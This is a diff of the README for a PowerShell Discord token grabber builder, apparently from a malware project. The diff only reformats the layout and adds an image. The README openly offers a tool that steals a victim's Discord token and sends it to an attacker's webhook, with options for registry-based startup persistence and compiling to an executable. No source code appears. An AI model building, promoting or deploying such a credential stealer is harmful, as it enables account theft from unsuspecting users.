@@ -1,12 +1,14 @@
 PSGrab - Builder is an builder of discord token grabber written in powershell.
 The victim token will automatically be sent to the specified webhook.
 
-It has several options:
+<p align="center">
+<img src="https://cdn.discordapp.com/attachments/956244677147897986/961921538930667550/unknown.png", width="480", height="196">
+</p>
+<p align="center">It has several options:</p>
 
-	- Make the file persistent : 
-		Add the grabber to a registry key to start him at startup.
+* Make the file persistent : 
+	Add the grabber to a registry key to start him at startup.
 
-	- Do you want to compil the output :
-		Automatically compile the powershell grabber file to an executable file.
-		(Script written in powershell will be removed with this option.)
-
+* Do you want to compil the output :
+	Automatically compile the powershell grabber file to an executable file.
+	(Script written in powershell will be removed with this option.)
